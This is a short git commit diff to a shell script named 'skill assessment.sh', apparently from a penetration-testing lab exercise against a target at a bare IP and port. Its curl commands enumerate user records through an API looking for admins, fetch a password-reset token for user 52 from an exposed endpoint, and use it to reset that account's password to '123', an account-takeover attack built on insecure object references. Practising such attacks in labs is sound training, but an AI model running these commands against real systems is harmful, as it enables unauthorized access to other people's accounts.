b991bd0714a7a4aa5c869d0bb0d352e99e45582e
George Jeoung (Euyin) <justice2638@hotmail.com>
2025-06-25 03:31:26 +0000

    Update skill assessment.sh

--- skill assessment.sh
+++ skill assessment.sh
@@ -1,4 +1,4 @@
-  
+for uid in {1..100}; do curl -s "http://94.237.55.43:50149/api.php/user/$uid"; echo; done | grep -i "admin"  
   curl -v -X GET "http://94.237.55.43:50149/reset.php?uid=52&token=$ADMIN_TOKEN&password=123"
   
   ADMIN_TOKEN=$(curl -s "http://94.237.55.43:50149/api.php/token/52" | jq -r .token)
